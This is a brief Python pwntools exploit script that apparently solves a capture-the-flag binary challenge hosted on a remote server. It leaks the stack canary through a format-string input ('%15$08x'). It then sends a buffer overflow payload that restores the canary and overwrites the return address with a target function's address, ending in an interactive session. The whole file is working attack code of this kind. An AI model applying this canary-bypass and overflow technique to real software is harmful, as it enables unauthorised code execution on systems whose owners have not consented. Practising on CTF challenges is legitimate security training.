from pwn import *

elf=ELF('./binary_200')
#remote server has no elf named binary_200, so we load local elf
r=remote('bamboofox.cs.nctu.edu.tw',22002)
print 'start'
#r=process('./binary_200')

sysadr=elf.symbols['canary_protect_me']

#use gdb to justify canary in args of printf
r.sendline('%15$08x')
print 'leak canary start'
canary=r.recv()[:8]
print 'Canary is 0x'+canary

#Bypass canary leaked and attack the stack
payload='A'*(0x2c-0x4)+canary.decode("hex")[::-1]+'a'*0xc+p32(sysadr)
r.sendline(payload)

r.interactive()
